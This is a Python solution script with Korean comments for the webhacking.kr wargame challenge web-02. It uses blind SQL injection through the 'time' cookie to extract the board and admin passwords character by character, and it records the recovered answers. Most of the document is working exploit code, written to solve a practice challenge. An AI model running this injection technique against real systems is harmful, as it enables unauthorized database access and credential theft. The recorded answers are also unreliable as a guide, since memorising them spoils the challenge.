#problem : http://webhacking.kr/challenge/web/web-02/
'''
---설명---
 홈페이지에서 admin 페이지를 확인하였으나 SQL Injection 불가
 Board 메뉴로 이동하면 게시판명이 FreeB0aRd라고 적혀 있고
 메인페이지에서 소스코드를 확인하면 주석처리된 현재시간 확인
 쿠키값 time에 SQL INJDECION 쿼리를 추가하여 시도 하면 값이 달라지는 것을 확인
 <!--2070-01-01 09:00:01--> 참
 <!--2070-01-01 09:00:00--> 거짓
 time= xxxxx and (select length(password) from FreeB0aRd) = 8~ 10 등으로 비밀번호 자릿 수 확인
 time= xxxxx and (select length(password) form admin = 8~10 등으로 비밀번호 자릿 수 확인
'''
import urllib.request
import re

#로그인 한 세션ID 설정
phpsessid = "45891863b038755822419f7e27b9718d"

print("FreeB0aRd password and admin password find Start")

#FreeB0aRd 게시글의 비밀번호 찾기(공격방법 : 무차별대입공격)
pw=""
for i in range(1,11):
    for j in range(33,126):
        url="http://webhacking.kr/challenge/web/web-02/"
        req=urllib.request.Request(url)
        req.add_header('Cookie',"time=1432644376 and (select ascii(substring(password,%d,1)) from FreeB0aRd)=%d; PHPSESSID=%s" %(i,j,phpsessid))
        html=urllib.request.urlopen(req).read().decode('ISO-8859-1')

        if re.findall("<!--2070-01-01 09:00:01-->",html):
            pw=pw+chr(j)
            print("FreeBoard : %s" % pw)
            break

print("FreeB0aRd Password is %s" % pw)

#solve : FreeB0aRd password 7598522ae
#게시판에 나온 패스워드 결과를 대입하면 첨부파일 다운로드 가능

#admin페이지의 계정 비밀번호 찾기(공격방법 : 무차별대입공격)
pw=""
for i in range(1,11):
    for j in range(33,126):
        url="http://webhacking.kr/challenge/web/web-02/"
        req=urllib.request.Request(url)
        req.add_header('Cookie',"time=1529121876 and (select ascii(substr(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(i,j,phpsessid))
        html=urllib.request.urlopen(req).read().decode('ISO-8859-1')

        if re.findall("<!--2070-01-01 09:00:01-->",html):
            pw=pw+chr(j)
            print("admin: %s" % pw)
            break

print("Admin Password is %s" % pw)

#solve : admin password 0nly_admin
#admin 계정으로 로그인하면 첨부파일의 비밀번호를 확인하여 압축해제